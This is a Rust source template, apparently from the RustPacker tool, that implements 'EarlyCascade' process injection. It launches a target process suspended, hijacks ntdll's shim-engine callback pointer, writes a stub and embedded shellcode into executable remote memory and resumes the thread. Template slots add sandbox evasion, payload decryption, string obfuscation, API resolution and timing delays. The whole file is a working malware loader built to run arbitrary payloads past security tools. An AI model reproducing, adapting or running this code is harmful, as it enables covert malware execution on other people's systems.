// EarlyCascade Injection
// Integrated into RustPacker's template pipeline.

#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

use std::include_bytes;
use std::mem::zeroed;
use std::ptr::{null, null_mut};

use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        LibraryLoader::GetModuleHandleA,
        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
        Threading::{
            CREATE_SUSPENDED, CreateProcessA, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA,
            TerminateProcess,
        },
    },
};
use windows_sys::core::s;

mod core_file;
mod stubs;

use core_file::{{{FN_ENC_PTR}}, find_se_dll_loaded, find_shims_enabled};
use stubs::{STUB, STUB_PLACEHOLDER_OFFSET};

{{IMPORTS}}

{{SANDBOX_IMPORTS}}

{{DECRYPTION_FUNCTION}}

{{STR_DECODER}}

{{API_RESOLVER}}

fn wipe(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
    }
    buf.clear();
}

// Called by the NT_DELAY placeholders when the nt_delay evasion is selected.
#[allow(dead_code)]
fn {{FN_PAUSE}}(ms: u64) {
    std::thread::sleep(std::time::Duration::from_millis(ms));
}

unsafe fn {{FN_CASCADE}}(shellcode: &[u8], target_process: &[u8]) {
    let si = zeroed::<STARTUPINFOA>();
    let mut pi = zeroed::<PROCESS_INFORMATION>();

    let success = CreateProcessA(
        null(),
        target_process.as_ptr() as _,
        null(),
        null(),
        0,
        CREATE_SUSPENDED,
        null(),
        null(),
        &si,
        &mut pi,
    );
    if success == 0 {
        return;
    }

    {{NT_DELAY_STEP}}

    let ntdll = GetModuleHandleA(s!("ntdll.dll")) as u64;
    if ntdll == 0 {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return;
    }

    let (se_dll_loaded, offset_addr) = match find_se_dll_loaded(ntdll) {
        Some(x) => x,
        None => {
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return;
        }
    };

    let shims_enabled = match find_shims_enabled(ntdll, offset_addr) {
        Some(x) => x,
        None => {
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return;
        }
    };

    let remote_mem = VirtualAllocEx(
        pi.hProcess,
        null_mut(),
        STUB.len() + shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    if remote_mem.is_null() {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return;
    }

    {{NT_DELAY_STEP}}

    let stub_addr = remote_mem as u64;
    let shell_addr = stub_addr + STUB.len() as u64;

    let mut patched_stub: Vec<u8> = {{FN_DECODER}}(STUB);
    let placeholder = STUB_PLACEHOLDER_OFFSET;
    patched_stub[placeholder..placeholder + 8]
        .copy_from_slice(&shims_enabled.to_le_bytes());

    WriteProcessMemory(
        pi.hProcess,
        remote_mem,
        patched_stub.as_ptr() as _,
        patched_stub.len(),
        null_mut(),
    );

    WriteProcessMemory(
        pi.hProcess,
        shell_addr as _,
        shellcode.as_ptr() as _,
        shellcode.len(),
        null_mut(),
    );

    let encoded_ptr = {{FN_ENC_PTR}}(stub_addr);
    WriteProcessMemory(
        pi.hProcess,
        se_dll_loaded as _,
        &encoded_ptr as *const _ as _,
        8,
        null_mut(),
    );

    let enable: u8 = 1;
    WriteProcessMemory(
        pi.hProcess,
        shims_enabled as _,
        &enable as *const _ as _,
        1,
        null_mut(),
    );

    {{NT_DELAY_STEP}}
    {{NT_DELAY_FINAL}}

    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

fn main() {
    {{NT_DELAY_AT_START}}
    {{SANDBOX}}

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = buf.to_vec();

    {{MAIN}}

    // Process name must be NUL-terminated for CreateProcessA.
    let target = b"{{TARGET_PROCESS}}\0";
    unsafe { {{FN_CASCADE}}(&vec, target); }
    wipe(&mut vec);
}

{{DLL_MAIN}}
